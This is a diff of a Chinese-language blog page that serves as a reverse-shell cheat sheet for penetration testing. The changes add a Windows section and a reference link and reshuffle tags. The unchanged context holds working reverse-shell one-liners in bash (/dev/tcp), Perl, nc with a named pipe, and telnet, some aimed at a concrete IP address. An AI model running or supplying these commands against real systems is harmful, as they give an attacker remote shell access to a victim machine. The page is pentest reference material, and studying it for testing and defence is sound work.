@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="owefsad&#39;s blog">
 <meta property="og:description" content="简介渗透测试过程中, 经常遇到WEB获取反弹shell、数据库获取反弹shell等场景, 本文记录诸位大佬们研究的反弹shell的技巧, 作为一个cheatsheet. 状态: 持续总结中">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-04-24T05:10:14.764Z">
+<meta property="og:updated_time" content="2019-05-12T18:37:51.342Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="how get a reverse shell">
 <meta name="twitter:description" content="简介渗透测试过程中, 经常遇到WEB获取反弹shell、数据库获取反弹shell等场景, 本文记录诸位大佬们研究的反弹shell的技巧, 作为一个cheatsheet. 状态: 持续总结中">
@@ -207,8 +207,9 @@
 <p>状态: 持续总结中<br><a id="more"></a></p>
 <h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><ul>
 <li>linux下创建反弹shell</li>
+<li>Windows下创建反弹shell</li>
 </ul>
-<h4 id="linux下反弹shell"><a href="#linux下反弹shell" class="headerlink" title="linux下反弹shell"></a>linux下反弹shell</h4><p>1.上传反弹文件（脚本、木马）</p>
+<h2 id="linux下反弹shell"><a href="#linux下反弹shell" class="headerlink" title="linux下反弹shell"></a>linux下反弹shell</h2><p>1.上传反弹文件（脚本、木马）</p>
 <p>2.bash<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/&lt;Attackip&gt;/&lt;Attackport&gt; 0 &gt;&amp;1</span><br></pre></td></tr></table></figure></p>
 <p>该命令在渗透测试中占据榜首多年, 是反弹 shell的首选命令, 但是在一些系统中无法成功运行, 目前在centos下实测过可正常反弹shell.</p>
 <p>3.perl<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e <span class="string">'use Socket;$i="&lt;Attackip&gt;";$p=&lt;Attackport&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure></p>
@@ -222,6 +223,7 @@
 <p>10.nc<br>1) 使用-e参数<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
 <p>2) 不使用-e参数<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Victim</span></span><br><span class="line">mknod /tmp/backpipe p</span><br><span class="line"></span><br><span class="line"><span class="comment"># Victim</span></span><br><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure></p>
 <p>11.telnet<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br><span class="line">telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888</span><br></pre></td></tr></table></figure></p>
+<h2 id="reverse-shell-on-windows"><a href="#reverse-shell-on-windows" class="headerlink" title="reverse shell on windows"></a>reverse shell on windows</h2><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.anquanke.com/post/id/99793" target="_blank" rel="noopener">powershell反弹shell常见方式总结</a></p>
 
       
 
@@ -307,7 +309,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文章目录"><span class="toc-number">1.</span> <span class="toc-text">文章目录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#linux下反弹shell"><span class="toc-number">1.0.1.</span> <span class="toc-text">linux下反弹shell</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文章目录"><span class="toc-number">1.</span> <span class="toc-text">文章目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux下反弹shell"><span class="toc-number">2.</span> <span class="toc-text">linux下反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse-shell-on-windows"><span class="toc-number">3.</span> <span class="toc-text">reverse shell on windows</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#参考文章"><span class="toc-number">3.0.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -461,14 +463,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">pip</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
@@ -485,11 +479,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">pip</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">joomla</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">pcap_analyze</a>
+                <a href="javascript:void(0)" class="js-tag color4">reverse_rbash</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -497,19 +499,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">jenkins</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">crontab</a>
+                <a href="javascript:void(0)" class="js-tag color3">pcap_analyze</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">wmi</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">reverse_rbash</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -521,19 +515,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">url_brute</a>
+                <a href="javascript:void(0)" class="js-tag color3">jenkins</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">rce</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">sandbox</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">hexo美化</a>
+                <a href="javascript:void(0)" class="js-tag color3">crontab</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -545,15 +531,31 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">rce</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">sandbox</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">url_brute</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">hexo美化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">latex</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">reverse_shell</a>
+                <a href="javascript:void(0)" class="js-tag color4">tty</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">tty</a>
+                <a href="javascript:void(0)" class="js-tag color4">reverse_shell</a>
               </li>
              
               <li class="article-tag-list-item">
